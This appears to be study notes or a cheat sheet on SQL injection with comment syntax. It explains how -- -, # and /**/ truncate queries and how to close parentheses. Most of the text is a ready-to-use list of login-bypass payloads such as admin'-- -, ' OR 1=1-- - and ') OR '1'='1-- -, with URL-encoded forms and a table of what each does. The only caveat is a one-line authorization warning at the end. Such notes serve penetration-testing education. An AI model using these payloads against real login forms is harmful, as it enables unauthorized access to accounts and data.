# SQL Injection - Using Comments

## Comment Syntax

```
-- -              # Line comment (requires space after --)
#                 # Line comment
/**/              # Inline/multi-line comment
```

> **Note:** `--` must have a space after it: `-- ` (URL encoded as `--+`)

---

## Authentication Bypass with Comments

### Basic Comment Injection
```
'-- -              # Comment out everything after username
'#                 # Alternative comment syntax
'/**/              # Inline comment
```

**Result:**
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password='...';
-- Everything after -- is ignored
```

---

## Handling Parenthesis in Queries

### When Query Has Parenthesis
If the original query has parentheses like:
```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='...';
```

### Bypass Payloads with Parenthesis
```
admin')-- -        # Close parenthesis then comment
admin')#           # Close parenthesis then comment
admin')/**/        # Close parenthesis then inline comment
admin') or '1'='1-- -  # Close parenthesis, inject OR, comment rest
admin'))-- -       # Close two parentheses if needed
```

**Result:**
```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='...';
-- Query becomes: SELECT * FROM logins WHERE (username='admin')
```

---

## Common Comment Injection Commands

### Username Field Injections
```
'-- -              # Comment out password check
'#                 # Comment out password check
admin'-- -         # Specific username with comment
admin'#            # Specific username with comment
' OR 1=1-- -       # Always true + comment
' OR 'x'='x'#      # Always true + comment
')-- -             # Close parenthesis + comment
'))-- -            # Close two parentheses + comment
') OR '1'='1-- -   # Close parenthesis + OR + comment
```

### URL Encoded Versions
```
%27--%20-          # '-- - 
%27%23             # '#
%27%29--%20-       # ')-- -
%27%29%23          # ')#
```

---

## Payload Examples with Explanations

| Payload | What It Does |
|---------|--------------|
| `'-- -` | Ignores everything after username |
| `'#` | Comments out password condition |
| `admin'-- -` | Logs in as admin, ignores password |
| `admin')-- -` | Closes parenthesis, logs in as admin |
| `admin'))-- -` | Closes multiple parentheses |
| `' OR 1=1-- -` | Always true, ignores rest |
| `' OR 1=1#` | Always true with # comment |
| `') OR ('1'='1-- -` | Close paren, OR true, comment rest |
| `' UNION SELECT 1,2-- -` | UNION injection with comment |
| `' AND 1=1-- -` | Boolean true with comment |
| `' AND 1=2-- -` | Boolean false with comment |

---

## Key Points

1. **`-- -`** requires a space after `--` (use `--+` or `--%20` in URLs)
2. **`#`** works in MySQL but may need URL encoding `%23` in browsers
3. **Close parentheses** when the original query has them
4. **Count parentheses** if you get syntax errors
5. **Comments ignore** everything after them, including AND/OR conditions

---

> ⚠️ **Warning:** Use only on authorized systems for security testing.
